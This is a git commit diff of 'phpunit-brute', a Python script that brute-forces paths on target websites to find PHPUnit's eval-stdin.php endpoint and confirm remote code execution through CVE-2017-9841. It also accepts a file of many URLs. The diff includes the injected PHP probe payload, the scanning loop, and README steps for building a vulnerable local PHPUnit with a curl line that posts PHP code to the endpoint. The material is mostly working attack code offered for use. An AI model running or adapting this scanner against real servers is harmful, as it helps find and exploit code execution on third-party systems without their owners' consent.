e41463c0c7607e12397655c146df0daa7dfdc996
Emad Youssef <48482029+Sy3Omda@users.noreply.github.com>
2021-08-04 14:37:03 +0200

    fix and add output feature

--- README.md
+++ README.md
@@ -1,14 +1,20 @@
 # phpunit-brute
 
-Tool to try multiple paths for PHPunit RCE (CVE-2017-9841) and it will log found paths to found.txt in the dir.
+Tool to try multiple paths for PHPunit RCE (CVE-2017-9841).
 
-It uses the following list of paths `https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/phpunit.txt`
+It uses local payloads list
 
 if you have a path that is not on there please submit a PR
 
-
+Install
+---
 ```
-usage: phpunit-brute.py [-h] -u URL [-p PROXY]
+python3 -m pip install -r requirements.txt
+```
+usage
+---
+```
+phpunit-brute.py [-h] -u URL [-o OUTPUT] [-p PROXY]
 phpunit-brute.py: error: the following arguments are required: -u/--url
 ```
 
@@ -17,7 +23,7 @@ Example
 ---
 
 ```
-python3 phpunit-brute.py -u http://someoldwebsite.com
+python3 phpunit-brute.py -u http://someoldwebsite.com -o results.txt
 
 
 [-] No Luck for /_inc/vendor/stripe/stripe-php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
@@ -31,3 +37,20 @@ python3 phpunit-brute.py -u http://someoldwebsite.com
 [-] No Luck for /20170811125232/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
 [+] Found RCE for http://someoldwebsite.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [+]
 ```
+
+Testing the script
+---
+in case you want to test the script install following
+```
+sudo apt -y install curl php-cli php-xml php-mbstring git unzip
+sudo php composer-setup.php --install-dir=/usr/local/bin --filename=composer
+php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"
+php -r "if (hash_file('sha384', 'composer-setup.php') === '756890a4488ce9024fc62c56153228907f1545c228516cbf63f885e036d37e9a59d27d63f46af1d4d07ee0f76181c7d3') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;"
+php composer-setup.php
+php -r "unlink('composer-setup.php');"
+composer require phpunit/phpunit:5.6.2
+```
+run it using
+```php -S 127.0.0.1:8888```
+and before testing script confirm the bug using curl
+```curl --data "<?php echo(pi());"http://localhost:8888/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php```
--- phpunit-brute.py
+++ phpunit-brute.py
@@ -1,17 +1,15 @@
-#!/usr/bin/env python
-#
-# 
-#
+#!/usr/bin/env python3
+
 # phpunit-brute.py - Finding paths to phpunit to gain RCE. (CVE-2017-9841)
 #
 # By @RandomRobbieBF
-# 
-#
 
 import requests
 import sys
 import argparse
 import os.path
+import colorama
+from colorama import Fore, Style
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 session = requests.Session()
@@ -21,19 +19,17 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url", required=False ,default="http://localhost",help="URL to test")
 parser.add_argument("-f", "--file", default="",required=False, help="File of urls")
 parser.add_argument("-p", "--proxy", default="",required=False, help="Proxy for debugging")
+parser.add_argument("-o", "--output", default="",required=False, help="output file")
 
 args = parser.parse_args()
 url = args.url
 urls = args.file
-
+output = args.output
 
 if args.proxy:
-	proxy = args.proxy
+    proxy = args.proxy
 else:
-	proxy = ""
-	
-	
-
+    proxy = ""
 
 http_proxy = proxy
 proxyDict = { 
@@ -41,66 +37,63 @@ proxyDict = {
               "https" : http_proxy, 
               "ftp"   : http_proxy
             }
-            
-            
-
-
 
 def test_url(url,urlpath):
-	newurl = ""+url+""+urlpath+""
-	rawBody = "<?php phpinfo();"
-	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
-	try:
-		response = session.post(newurl, headers=headers,verify=False,data=rawBody, proxies=proxyDict,timeout=30)
-		if response.status_code == 200:
-			if "PHP License as published by the PHP Group" in response.text:
-				print("[+] Found RCE for "+newurl+" [+]")
-				text_file = open("found.txt", "a")
-				text_file.write(""+newurl+"\n")
-				text_file.close()
-				return True
-			else:
-				print("[-] No Luck for "+urlpath+" [-]")
-		else:
-			print("[-] No Luck for "+urlpath+" [-]")
-	except Exception as e:
-		print ("[-]Check Url might have Issues[-]")
-		print(e)
-		sys.exit(0)
-			
-			
+    newurl = ""+url+""+urlpath+""
+    rawBody = "<?php echo md5(phpunit_rce);"
+    headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
+    try:
+        response = session.get(newurl, headers=headers,verify=False,data=rawBody, proxies=proxyDict,timeout=30)
+        if response.status_code == 200:
+            if "6dd70f16549456495373a337e6708865" in response.text:
+                print(Style.BRIGHT + Fore.GREEN + "[+] Found RCE for "+newurl+" [+]")
+                text_file = open(output, "a")
+                text_file.write(""+newurl+"\n")
+                text_file.close()
+                return True
+            else:
+                print(Style.BRIGHT + Fore.RED + "[-] No Luck for "+newurl+" [-]")
+        else:
+            print(Style.BRIGHT + Fore.RED + "[-] No Luck for "+newurl+" [-]")
+    except Exception as e:
+        print ("[-]Check Url might have Issues[-]")
+        print(e)
+        sys.exit(0)
+
 def grab_paths(url):
-	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
-	try:
-		response = session.get("https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/phpunit.txt", headers=headers,verify=False, proxies=proxyDict)
-		lines = response.text.strip().split('\n')
-		for urlpath in lines:
-			loop = test_url(url,urlpath)
-			if loop:
-				break
-	except Exception as e:
-		print("[-] Failed to obtain paths file [-]")
-		print(e)
-		sys.exit(0)
-				
+    headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
+    try:
+        #response = session.get("https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/phpunit.txt", headers=headers,verify=False, proxies=proxyDict)
+        #lines = response.text.strip().split('\n')
+
+        with open("payloads.txt", 'r') as file:
+          for line in file:
+              lines = line.strip()
+              #print(lines)
+              loop = test_url(url,lines)
+          file.close()
+
+    except Exception as e:
+        print("[-] Failed to obtain paths file [-]")
+        print(e)
+        sys.exit(0)
 
 
 if urls:
-	if os.path.exists(urls):
-		with open(urls, 'r') as f:
-			for line in f:
-				url = line.replace("\n","")
-				try:
-					print("Testing "+url+"")
-					grab_paths(url)
-				except KeyboardInterrupt:
-					print ("Ctrl-c pressed ...")
-					sys.exit(1)
-				except Exception as e:
-					print('Error: %s' % e)
-					pass
-		f.close()
-	
+    if os.path.exists(urls):
+        with open(urls, 'r') as f:
+            for line in f:
+                url = line.replace("\n","")
+                try:
+                    print("Testing "+url+"")
+                    grab_paths(url)
+                except KeyboardInterrupt:
+                    print ("Ctrl-c pressed ...")
+                    sys.exit(1)
+                except Exception as e:
+                    print('Error: %s' % e)
+                    pass
+        f.close()
 
 else:
-	grab_paths(url)
+    grab_paths(url)
